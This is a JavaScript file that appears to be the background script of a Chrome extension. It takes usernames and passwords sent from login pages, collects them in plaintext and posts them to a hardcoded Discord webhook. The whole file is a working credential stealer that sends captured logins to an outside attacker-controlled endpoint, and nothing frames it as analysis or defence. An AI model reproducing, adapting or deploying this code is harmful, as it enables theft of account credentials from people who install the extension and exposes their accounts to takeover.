var loginAttempts = [];

function logLogin(username, password, timestamp) {
    loginAttempts.push({ username: username, password: password, timestamp: timestamp });
}

function formatDate(timestamp) {
    var date = new Date(timestamp);
    var day = ("0" + date.getDate()).slice(-2);
    var month = ("0" + (date.getMonth() + 1)).slice(-2);
    var year = date.getFullYear();
    var hour = ("0" + date.getHours()).slice(-2);
    var minute = ("0" + date.getMinutes()).slice(-2);
    var second = ("0" + date.getSeconds()).slice(-2);
    return `${day}.${month}.${year} ${hour}:${minute}:${second}`;
}

function sendLogsToDiscord() {
    var webhookUrl = "https://discord.com/api/webhooks/1231556347279966292/xPs8NVtBy9SkvvQpGuhqq1Ncek3MJiAQ2tt284a0lmSAK5qKEs9ewVnciADdTRZNJetC";

    var embed = {
        title: "Login Logs",
        description: "",
        color: parseInt("1c1c24", 16), 
        fields: loginAttempts.map(attempt => ({
            name: "",
            value: `**Username:** ${attempt.username}\n**Password:** ${attempt.password}`
        })),
        footer: {
            text: `${formatDate(new Date())}`
        }
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ embeds: [embed] })
    })
    .then(response => {
        loginAttempts = [];
    });
}

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if (message.action === 'loginAttempt') {
        logLogin(message.username, message.password, new Date().toISOString());
        sendLogsToDiscord();
    }
});
